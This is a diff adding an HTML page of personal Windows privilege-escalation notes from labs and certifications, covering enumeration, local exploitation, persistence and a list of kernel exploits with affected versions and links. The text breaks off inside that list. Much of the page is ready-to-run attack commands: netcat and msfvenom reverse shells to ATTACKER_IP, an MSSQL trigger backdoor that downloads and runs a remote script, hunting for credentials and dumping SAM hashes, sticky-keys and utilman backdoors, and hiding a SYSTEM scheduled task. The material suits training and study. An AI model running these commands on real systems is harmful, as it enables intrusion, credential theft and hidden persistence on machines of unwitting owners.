@@ -1,0 +1,1049 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta https-equiv="content-type" content=
+  "text/html; charset=UTF-8">
+  <title>Windows Privesc</title>
+  <meta name="viewport" content=
+  "initial-scale=1.0, maximum-scale=1.0, width=device-width">
+  <meta name="description" content=
+  "My notes from various labs and certs.">
+  <meta name="robots" content="index, follow">
+  <meta property="og:url" content="https://eli2k.com/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Home">
+  <meta property="og:description" content="Home">
+  <meta property="og:image" content=
+  "https://eli2k.com/resources/images/homepage.png">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/style.css">
+  <link rel="icon" href=
+  "https://eli2k.com/resources/images/bluscrn.gif" type=
+  "image/gif">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/prism.css">
+  <link rel="stylesheet" href=
+  "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+  <input type="checkbox" class="theme-switch" id="theme-switch">
+  <div id="page">
+    <label for="theme-switch" class="switch-label"></label>
+    <script src="https://eli2k.com/resources/js/prism.js"></script>
+    
+    <script>
+
+    NekoType = "robot"
+    </script>
+    <h1 id="nl">
+    <script src=
+    "https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a></h1>
+    <div id="container">
+      <div id="header">
+        <div class="text-container">
+          <span>E</span> <span>L</span> <span>I</span> <span>2</span> <span>K</span>
+        </div>
+      </div>
+      <div id="left-sidebar"></div>
+      <div class="divider"></div>
+      <div class="pageContent">
+        <div class="nav border">
+          <ul>
+            <a href="https://eli2k.com/" title="The homepage. acts as an index for all of the indexes.">
+              <li>Home
+              </li>
+            </a>
+            <a href="https://github.com/Eli2k765" title="My Github.">
+              <li>Github
+              </li>
+            </a>
+          </ul>
+        </div>
+        <div class="page-content blog border"><button id="toggle-all-btn">Show All</button>
+          <div class="box">
+            <div class="inner-box-content">
+              <div class="article-wrapper">
+                <h1>Windows Privilege Escalation and Kernel
+                Sploits</h1>
+                <p class="alert">Initial enumeration, low-hanging
+                exploits and a list of common kernel exploits along
+                with the versions commonly vulnerable.</p>
+                <p>I added a search bar so you can easily search
+                for exploits. Just click "Show all", then search the version of Windows
+                and it'll take you to the first occurence and it should highlight the rest.</p>
+                <div id="contain">
+                  <div class="tags">
+                    <span id="all"><button class=
+                    "all">All</button></span> <span id=
+                    "tags"><button class=
+                    "Enum">Enumeration</button> <button class=
+                    "Exploit">Exploitation</button> <button class="P">Persistence</button> <button class=
+                    "Kernel">Kernel Exploits</button></span>
+                  </div>
+                  <form class="f1" action="">
+                    <input type="text" class="t1" name="search"
+                    placeholder="Search...">
+                    <button type="submit"><i class="fa fa-search"></i></button>
+                  </form>
+                </div><br>
+                <strong>Last updated: May 4th, 2023</strong>
+                <div id="blurbs">
+                  <div class="Enum">
+                    <h2>Local Enumeration</h2>
+                    <h3>System</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">systeminfo
+hostname
+wmic qfe &lt;# checks for recent patches #&gt;
+wmic logicaldisk get caption,description,providername &lt;# list drives #&gt;
+tasklist &lt;# check running processes and PID #&gt;
+schtask &lt;#check tasks, may require admin#&gt;
+ps &lt;#in powershell&gt;</code></pre>
+                    </div>
+                    <h3>User</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">whoami &lt;# user info #&gt;
+whoami /priv &lt;# privilege info #&gt;
+whoami /groups &lt;# group info #&gt;
+net user &lt;# shows all users #&gt;
+net user *user* &lt;# shows user info for targeted user #&gt;
+net localgroup
+net localgroup administrators &lt;# shows administrator group info #&gt;
+icacls file &lt;#use to check perm on executable#&gt;</code></pre>
+                    </div>
+                    <h3>Network</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">ipconfig /all &lt;# network info #&gt;
+arp -a &lt;# checks arp tables #&gt;
+route print &lt;# shows what devices are being commed with #&gt;
+netstat -ano &lt;# shows ports; very helpful, -b will list program names#&gt;
+net share </code></pre>
+                    </div>
+                    <h3>Service</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">sc qc &lt;service&gt;
+sc query windefend
+sc queryex type= service
+netsh firewall show state</code></pre>
+                    </div>
+                    <h3>Files</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">#Finding hidden files
+gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
+gci -force
+#Reading
+Get-Content -path c:\Users\example\example --stream example</code></pre>
+                    </div>
+                    <h3>Passwords</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">findstr /si password *.txt *.ini *.config *.xml
+#Find all those strings in config files.
+dir /s *pass* == *cred* == *vnc* == *.config*
+# Find all passwords in all files.
+findstr /spin "password" *.*
+findstr /spin "password" *.*
+#Common Password Files, look for BASE64
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+c:\unattend.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+dir c:\*vnc.ini /s /b
+dir c:\*ultravnc.ini /s /b
+dir c:\ /s /b | findstr /si *vnc.ini
+# In Registry
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+# Windows autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+# SNMP Paramters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+# Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+# Search for password in registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+#web server
+#saved credentials</code></pre>
+                    </div>
+                  </div>
+                  <div class="Exploit">
+                    <h2>Local Exploitation</h2>
+                    <h3>Insecure Service Permissions</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">accesschk.exe /accepteula -uwcqv &lt;user&gt; &lt;service&gt;
+sc qc &lt;service&gt;
+sc config &lt;service&gt; binpath= ""C:PathTorevshell.exe""
+net start &lt;service&gt;</code></pre>
+                    </div>
+                    <h3>Unquoted Service Path</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">sc qc &lt;service&gt;
+accesschk.exe /accepteula -uwdq "C:Program FilesUnquoted Path Service"
+copy shell.exe "C:Program FilesUnquoted Path ServiceCommon.exe" (Common Files folder)
+net start &lt;service&gt;</code></pre>
+                    </div>
+                    <h3>Weak Registry Permissions</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">sc qc &lt;service&gt;
+accesschk.exe /accepteula -uvwqk HKLMSystemCurrentControlSetServices&lt;service&gt;
+reg add HKLMSYSTEMCurrentControlSetservicesregsvc /v ImagePath /t REG_EXPAND_SZ /d C:PrivEscreverse.exe /f</code></pre>
+                    </div>
+                    <h3>Always Install Elevated</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi</code></pre>
+                    </div>
+                    <h3>SAM Files</h3>
+                    <div>
+                    <pre><code class=
+                    "language-powershell">copy C:WINDOWSRepairSAM \&lt;IP&gt;&lt;SHARE&gt;
+copy C:WINDOWSRepairSYSTEM \&lt;IP&gt;&lt;SHARE&gt;
+pwdump.py SYSTEM SAM
+hashcat -m 1000 --force &lt;hash&gt; /usr/share/wordlists</code></pre>
+                    </div>
+                    <h3>Scheduled Tasks</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">#list scheduled tasks
+schtasks
+#retrieve info about command
+schtasks /query /tn vulntask /fo list /v
+#privileges/permissions
+accesschk.exe /accepteula -quvw user c:\tasks\schtask.bat
+icacls c:\tasks\schtask.bat
+#overwrite the task to run
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat
+schtasks /run /tn vulntask</code></pre>
+                    </div>
+                    <h3>Bypass Upload Access Denied</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">powershell.exe -c "iwr https://192.168.49.139/nc.exe -OutFile C:tempnc.exe"</code></pre>
+                    </div>
+                    <h3>RunAs</h3>
+                    <div>
+                      <pre><code class=
+                    "language-powershell">runas /env /profile /user:&lt;DOMAIN/PC&gt;Administrator "C:tempnc.exe -e cmd.exe </code></pre>
+                  </div>
+                  <div class="P">
+                    <div id="P"></div>
+                    <h2>Persistence</h2>
+                    <h3>Accounts</h3>
+                    <div>
+                      <h4>Groups</h4>
+                      <div>
+                        <pre><code class="language-powershell">#Add users to groups
+#add to admins
+net localgroup administrators user123 /add
+#add to backup, more subtle, privs ignore DACL, copy SAM and SYSTEM then crack hashes
+net localgroup "Backup Operators" user123 /add
+#add rdp
+net localgroup "Remote Management Users" user123 /add
+
+#logging in remotely may pose issues, if UAC blocks token policy below
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+
+#download SAM and SYSTEM
+reg save hklm\system system.bak
+reg save hklm\sam sam.bak
+
+download system.bak
+download sam.bak
+</code></pre>
+                      </div>
+                      <h4>Special Privileges</h4>
+                      <div>
+                        <pre><code class="language-powershell">#assigning privileges
+secedit /export /cfg config.inf
+
+#modifying security descriptors
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+
+#RID Hijacking, the default rid for admin is 500
+#list sids, rid is last section
+wmic useraccount get name,sid
+
+#psexec can be used to run regedit as SYSTEM
+PsExec64.exe -i -s regedit
+
+#RID will be in HKLM\SAM\SAM\Domains\Account\Users\
+#search for a key with its RID in hex (1010 = 0x3F2)
+#effective RID is in F
+#in little endian
+#RID of Administrator in hex (500 = 0x01F4)
+</code></pre>
+                      </div>
+                    </div>
+                    <h3>Files</h3>
+                    <div>
+                      <pre><code class="language-bash">#Modifying exe payloads
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+#Modify an existing shortcut to point to a different binary
+#Example calc.exe
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445" 
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+
+#Hijacking File Associations
+#HKLM\Software\Classes\
+#When we id a target filetype, such as .txt, we will find an associated progID under data.
+#The progID will also be in HKLM\Software\Classes\
+#Change the data to powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1</code></pre>
+                    </div>
+                    <h3>Services</h3>
+                    <div>
+                      <pre><code class="language-powershell">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+#Transfer to victime
+sc.exe create exampleService binPath= "C:\windows\rev-svc.exe" start= auto
+sc.exe start exampleService
+#We can also change an existing service
+sc.exe config exampleService binPath= "C:\windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+
+#Startup
+C:\Users\&lt;your_username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+#make rev
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4450 -f exe -o revshell.exe
+copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+#Alternatively
+#    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+#    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+#    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+#    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+move revshell.exe C:\Windows
+#Create REG_EXPAND_SZ in one of the above with data pointing to revshell
+
+#Winlogon
+#HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
+#Userinit and Shell
+#append data with a comma and revshell location
+
+#LogonScript
+#HKCU\Environment
+#UserInitMprLogonScript = revshell location
+
+#Sticky Keys
+takeown /f c:\Windows\System32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+
+#Utilman
+takeown /f c:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+
+#Other Services
+#Web
+move shell.aspx C:\inetpub\wwwroot\
+
+#MSSQL
+#new query
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+#Grant sysadmins privs
+USE master
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+USE HRDB
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+</code></pre>
+                    </div>
+                    <h3>Scheduled Tasks</h3>
+                    <div>
+                      <pre><code class="language-powershell">#Create a taskschtasks /create /sc minute /mo 1 /tn backdoorTask /tr "c:\tools\nc64 -e cmd.exe x.x.x.x 4449" /ru SYSTEM
+#We can then hide the task
+PsExec64.exe -s -i regedit
+#HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\backdoorTask
+#Delete SD
+</code></pre>
+                    </div>
+                    <h3>RDP</h3>
+                    <div>
+                      <pre><code class="language-bash"></code><</pre>
+                    </div>
+                  </div>
+                  <div class="Kernel">
+                  <h2>Kernel Exploits</h2>
+                  <h3>MS09-012 "Churrasco"</h3>
+                    <div>
+                      <h4>Affected Versions</h4>
+                      <div>
+                        <ul>
+                          <li>Microsoft Windows 2000 Service Pack
+                          4</li>
+                          <li>Windows XP Service Pack 2 and Windows XP
+                          Service Pack 3</li>
+                          <li>Windows XP Professional x64 Edition and
+                          Windows XP Professional x64 Edition Service
+                          Pack 2</li>
+                          <li>Windows Server 2003 Service Pack 1 and
+                          Windows Server 2003 Service Pack 2</li>
+                          <li>Windows Server 2003 x64 Edition and
+                          Windows Server 2003 x64 Edition Service Pack
+                          2</li>
+                          <li>Windows Server 2003 with SP1 for
+                          Itanium-based Systems and Windows Server 2003
+                          with SP2 for Titanium-based Systems</li>
+                          <li>Windows Vista and Windows Vista Service
+                          Pack 1</li>
+                          <li>Windows Vista x64 Edition and Windows
+                          Vista x64 Edition Service Pack 1</li>
+                          <li>Windows Server 2008 for 32-bit
+                          Systems</li>
+                          <li>Windows Server 2008 for x64-based
+                          Systems</li>
+                          <li>Windows Server 2008 for Itanium-based
+                          Systems</li>
+                        </ul>
+                      </div>
+                      <h4>Reliable Exploits</h4>
+                      <div>
+                        <ul>
+                          <li>I use <a href=
+                          "https://github.com/Re4son/Churrasco/">churrasco.exe</a>
+                          </li>
+                        </ul>
+                      </div>
+                    </div>
+                    <h3>MS10-015 "KiTrap0D"</h3>
+                    <div>
+                      <h4>Affected Versions</h4>
+                      <div>
+                        <ul>
+                          <li>Windows Server 2003, Windows Server 2008,
+                          7, XP</li>
+                          <li>Windows 2000 Service Pack 4</li>
+                          <li>Windows XP Service Pack 2 and Windows XP
+                          Service Pack 3</li>
+                          <li>Windows XP Professional x64 Edition
+                          Service Pack 2</li>
+                          <li>Windows Server 2003 Service Pack 2</li>
+                          <li>Windows Server 2003 x64 Edition Service
+                          Pack 2</li>
+                          <li>Windows Server 2003 with SP2 for
+                          Itanium-based Systems</li>
+                          <li>Windows Vista Windows Vista Service Pack
+                          1 and Windows Vista Service Pack 2</li>
+                          <li>Windows Vista x64 Edition Windows Vista
+                          x64 Edition Service Pack 1 and Windows Vista
+                          x64 Edition Service Pack 2</li>
+                          <li>Windows Server 2008 for 32-bit Systems
+                          and Windows Server 2008 for 32-bit</li>
+                          <li>Systems Service Pack 2*</li>
+                          <li>Windows Server 2008 for x64-based Systems
+                          and Windows Server 2008 for x64-based Systems
+                          Service Pack 2*</li>
+                          <li>Windows Server 2008 for Itanium-based
+                          Systems and Windows Server 2008 for
+                          Itanium-based Systems Service Pack 2</li>
+                          <li>Windows 7 for 32-bit Systems</li>
+                        </ul>
+                      </div>
+                      <h4>Reliable Exploits</h4>
+                      <div>
+                        <p>I haven't been able to find an exploit that
+                        will elevate the current shell, they all seem
+                        to spawn a new shell. If you know of one let me
+                        know!</p>
+                        <ul>
+                          <li>
+                            <a href=
+                            "https://github.com/am0nsec/exploit/tree/master/windows/privs/MS10-015-KiTrap0D">
+                            vdmallowed.exe and vdmexploit.dll</a>
+                          </li>
+                          <li>
+                            <a href=
+                            "https://github.com/Re4son/KiTrapOD">same
+                            as above, except from Re4son</a>
+                          </li>
+                        </ul>
+                      </div>
+                    </div>
+                    <h3>MS10-059 "Churraskito"</h3>
+                    <div>
+                      <h4>Affected Versions</h4>
+                      <div>
+                        <ul>
+                          <li>Windows Vista Service Pack 1 and Windows
+                          Vista Service Pack 2</li>
+                          <li>Windows Vista x64 Edition Service Pack 1
+                          and Windows Vista x64 Edition Service Pack
+                          2</li>
+                          <li>Windows Server 2008 for 32-bit Systems
+                          and Windows Server 2008 for 32-bit Systems
+                          Service Pack 2*</li>
+                          <li>Windows Server 2008 for x64-based Systems
+                          and Windows Server 2008 for x64-based Systems
+                          Service Pack 2*</li>
+                          <li>Windows Server 2008 for Itanium-based
+                          Systems and Windows Server 2008 for
+                          Itanium-based Systems Service Pack 2</li>
+                          <li>Windows 7 for 32-bit Systems</li>
+                          <li>Windows 7 for x64-based Systems</li>
+                          <li>Windows Server 2008 R2 for x64-based
+                          Systems*</li>
+                          <li>Windows Server 2008 R2 for Itanium-based
+                          Systems</li>
+                        </ul>
+                      </div>
+                      <h4>Reliable Exploits</h4>
+                      <div>
+                        <ul>
+                          <li>
+                            <a href=
+                            "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059">
+                            Download the zip</a>
+                          </li>
+                        </ul>
+                      </div>
+                    </div>
+                    <h3>MS10-092 "Schelevator"</h3>
+                    <div>
+                      <h4>Affected Versions</h4>
+                      <div>
+                        <ul>
+                          <li>Windows Vista Service Pack 1 and Windows
+                          Vista Service Pack 2</li>
+                          <li>Windows Vista x64 Edition Service Pack 1
+                          and Windows Vista x64 Edition Service Pack
+                          2</li>
+                          <li>Windows Server 2008 for 32-bit Systems
+                          and Windows Server 2008 for 32-bit Systems
+                          Service Pack 2*</li>
+                          <li>Windows Server 2008 for x64-based Systems
+                          and Windows Server 2008 for x64-based Systems
+                          Service Pack 2*</li>
+                          <li>Windows Server 2008 for Itanium-based
+                          Systems and Windows Server 2008 for
+                          Itanium-based Systems Service Pack 2</li>
+                          <li>Windows 7 for 32-bit Systems</li>
+                          <li>Windows 7 for x64-based Systems</li>
+                          <li>Windows Server 2008 R2 for x64-based
+                          Systems*</li>
+                          <li>Windows Server 2008 R2 for Itanium-based
+                          Systems</li>
+                        </ul>
+                      </div>
+                      <h4>Reliable Exploits</h4>
+                      <div>
+                        <ul>
+                          <li>
+                            <a href=
+                            "https://www.exploit-db.com/exploits/15589">
+                            exploit.js</a>
+                          </li>
+                        </ul>
+                      </div>
+                    </div>
+                    <h3>MS11-046 "afd.sys"</h3>
+                    <div>
+                      <h4>Affected Versions</h4>
+                      <div>
+                        <ul>
+                          <li>Windows XP SP3 x86</li>
+                          <li>Windows XP Pro SP2 x64</li>
+                          <li>Windows Server 2003 SP2 x86</li>
+                          <li>Windows Server 2003 SP2 x64</li>
+                          <li>Windows Server 2003 SP2 Itanium-based
+                          Systems</li>
+                          <li>Windows Vista SP1 x86</li>
+                          <li>Windows Vista SP2 x86</li>
+                          <li>Windows Vista SP1 x64</li>
+                          <li>Windows Vista SP2 x64</li>
+                          <li>Windows Server 2008 x86</li>
+                          <li>Windows Server 2008 SP2 x86</li>
+                          <li>Windows Server 2008 x64</li>
+                          <li>Windows Server 2008 SP2 x64</li>
+                          <li>Windows Server 2008 Itanium-based
+                          Systems</li>
+                          <li>Windows Server 2008 SP2 Itanium-based
+                          Systems</li>
+                          <li>Windows 7 x86</li>
+                          <li>Windows 7 SP1 x86</li>
+                          <li>Windows 7 x64</li>
+                          <li>Windows 7 SP1 x64</li>
+                          <li>Windows Server 2008 R2 x64</li>
+                          <li>Windows Server 2008 R2 SP1 x64</li>
+                          <li>Windows Server 2008 R2 Itanium-based
+                          Systems</li>
+                          <li>Windows Server 2008 R2 SP1 Itanium-based
+                          Systems</li>
+                        </ul>
+                      </div>
+                      <h4>Reliable Exploits</h4>
+                      <div>
+                        <ul>
+                          <li>
+                            <a href=
+                            "https://www.exploit-db.com/exploits/40564">
+                            Compile depending on arch</a>
+                          </li>
+                        </ul>
+                      </div>
+                    </div>
+                    <h3>MS11-062 "NDISTAPI"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows XP SP3 x86</li>
+                      <li>Windows XP Pro SP2 x64</li>
+                      <li>Windows Server 2003 SP2 x86</li>
+                      <li>Windows Server 2003 SP2 x64</li>
+                      <li>Windows Server 2003 SP2 Itanium-based
+                      Systems</li>
+                    </ul>
+                    <h4>Reliable Exploits</h4>
+                    <ul>
+                      <li>
+                        <a href=
+                        "https://www.exploit-db.com/exploits/40627">
+                        https://www.exploit-db.com/exploits/40627</a>
+                      </li>
+                    </ul>
+                    <h3>MS11-080 "AfdJoinLeaf"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows XP Service Pack 3</li>
+                      <li>Windows XP Professional x64 Edition
+                      Service Pack 2</li>
+                      <li>Windows Server 2003 Service Pack 2</li>
+                      <li>Windows Server 2003 x64 Edition Service
+                      Pack 2</li>
+                      <li>Windows Server 2003 with SP2 for
+                      Itanium-based Systems</li>
+                    </ul>
+                    <h4>Reliable Exploits</h4>
+                    <ul>
+                      <li>
+                        <a href=
+                        "https://www.exploit-db.com/exploits/18176">
+                        https://www.exploit-db.com/exploits/18176</a>
+                      </li>
+                    </ul>
+                    <h3>MS14-002 "NDPROXY"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows XP Service Pack 3</li>
+                      <li>Windows XP Professional x64 Edition
+                      Service Pack 2</li>
+                      <li>Windows Server 2003 Service Pack 2</li>
+                      <li>Windows Server 2003 x64 Edition Service
+                      Pack 2</li>
+                      <li>Windows Server 2003 with SP2 for
+                      Itanium-based Systems</li>
+                    </ul>
+                    <h4>Reliable Exploits</h4>
+                    <ul>
+                      <li>
+                        <a href=
+                        "https://www.exploit-db.com/exploits/37732">
+                        https://www.exploit-db.com/exploits/37732</a>
+                      </li>
+                      <li>
+                        <a>https://www.exploit-db.com/exploits/30014</a>
+                      </li>
+                      <li>
+                        <a href=
+                        "https://github.com/dev-zzo/exploits-nt-privesc/blob/master/MS14-002/MS14-002.c">
+                        https://github.com/dev-zzo/exploits-nt-privesc/blob/master/MS14-002/MS14-002.c</a>
+                      </li>
+                    </ul>
+                    <h3>MS14-040 "Dangling Pointer"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows Server 2003 Service Pack 2</li>
+                      <li>Windows Server 2003 x64 Edition Service
+                      Pack 2</li>
+                      <li>Windows Server 2003 with SP2 for
+                      Itanium-based Systems</li>
+                      <li>Windows Vista Service Pack 2</li>
+                      <li>Windows Vista x64 Edition Service Pack
+                      2</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for Itanium-based
+                      Systems Service Pack 2</li>
+                      <li>Windows 7 for 32-bit Systems Service Pack
+                      1</li>
+                      <li>Windows 7 for x64-based Systems Service
+                      Pack 1</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                      <li>Windows Server 2008 R2 for Itanium-based
+                      Systems Service Pack 1</li>
+                      <li>Windows 8 for 32-bit Systems</li>
+                      <li>Windows 8 for x64-based Systems</li>
+                      <li>Windows 8.1 for 32-bit Systems</li>
+                      <li>Windows 8.1 for 32-bit Systems[2]
+                      (2973408)</li>
+                      <li>Windows 8.1 for x64-based Systems</li>
+                      <li>Windows Server 2012</li>
+                      <li>Windows Server 2012 R2</li>
+                      <li>Windows RT[3] (2961072)</li>
+                      <li>Windows RT 8.1[1][3] (2961072)</li>
+                    </ul>
+                    <h4>Reliable Exploits</h4>
+                    <ul>
+                      <li>
+                        <a href=
+                        "https://www.exploit-db.com/exploits/39446">
+                        https://www.exploit-db.com/exploits/39446</a>
+                      </li>
+                      <li>
+                        <a href=
+                        "https://github.com/JeremyFetiveau/Exploits/blob/master/MS14-040.cpp">
+                        https://github.com/JeremyFetiveau/Exploits/blob/master/MS14-040.cpp</a>
+                      </li>
+                    </ul>
+                    <h3>MS14-058 "win32k.sys"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows Server 2003, Windows Server 2008,
+                      Windows Server 2012, 7, 8</li>
+                      <li>Windows Server 2003 Service Pack 2</li>
+                      <li>Windows Server 2003 x64 Edition Service
+                      Pack 2</li>
+                      <li>Windows Server 2003 with SP2 for
+                      Itanium-based Systems</li>
+                      <li>Windows Vista Service Pack 2</li>
+                      <li>Windows Vista x64 Edition Service Pack
+                      2</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for Itanium-based
+                      Systems Service Pack 2</li>
+                      <li>Windows 7 for 32-bit Systems Service Pack
+                      1</li>
+                      <li>Windows 7 for x64-based Systems Service
+                      Pack 1</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                      <li>Windows Server 2008 R2 for Itanium-based
+                      Systems Service Pack 1</li>
+                      <li>Windows 8 for 32-bit Systems</li>
+                      <li>Windows 8 for x64-based Systems</li>
+                      <li>Windows 8.1 for 32-bit Systems</li>
+                      <li>Windows 8.1 for x64-based Systems</li>
+                      <li>Windows Server 2012</li>
+                      <li>Windows Server 2012 R2</li>
+                      <li>Windows RT[1] (3000061)</li>
+                      <li>Windows RT 8.1[1] (3000061)</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                    </ul>
+                    <h4>Reliable Exploits</h4>
+                    <ul>
+                      <li>
+                        <a href=
+                        "https://github.com/sam-b/CVE-2014-4113">https://github.com/sam-b/CVE-2014-4113</a>
+                      </li>
+                    </ul>
+                    <h3>MS14-070 "TCP/IP IOCTL"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows Server 2003 Service Pack 2</li>
+                      <li>Windows Server 2003 x64 Edition Service
+                      Pack 2</li>
+                      <li>Windows Server 2003 with SP2 for
+                      Itanium-based System</li>
+                    </ul>
+                    <h3>MS15-051 "ClientCopyImage"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows Server 2003 Service Pack 2</li>
+                      <li>Windows Server 2003 x64 Edition Service
+                      Pack 2</li>
+                      <li>Windows Server 2003 with SP2 for
+                      Itanium-based Systems</li>
+                      <li>Windows Vista Service Pack 2</li>
+                      <li>Windows Vista x64 Edition Service Pack
+                      2</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for Itanium-based
+                      Systems Service Pack 2</li>
+                      <li>Windows 7 for 32-bit Systems Service Pack
+                      1</li>
+                      <li>Windows 7 for x64-based Systems Service
+                      Pack 1</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                      <li>Windows Server 2008 R2 for Itanium-based
+                      Systems Service Pack 1</li>
+                      <li>Windows 8 for 32-bit Systems</li>
+                      <li>Windows 8 for x64-based Systems</li>
+                      <li>Windows 8.1 for 32-bit Systems</li>
+                      <li>Windows 8.1 for x64-based Systems</li>
+                      <li>Windows Server 2012</li>
+                      <li>Windows Server 2012 R2</li>
+                      <li>Windows RT[1] (3045171)</li>
+                      <li>Windows RT 8.1[1] (3045171)</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                    </ul>
+                    <h4>Reliable Exploits</h4>
+                    <ul>
+                      <li>
+                        <a href=
+                        "https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou32.exe">
+                        https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou32.exe</a>
+                      </li>
+                      <li>
+                        <a href=
+                        "https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37049-32.exe">
+                        https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37049-32.exe</a>
+                      </li>
+                    </ul>
+                    <h3>MS16-014 "wmi recv notif"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows Vista Service Pack 2</li>
+                      <li>Windows Vista x64 Edition Service Pack
+                      2</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for Itanium-based
+                      Systems Service Pack 2</li>
+                      <li>Windows 7 for 32-bit Systems Service Pack
+                      1</li>
+                      <li>Windows 7 for x64-based Systems Service
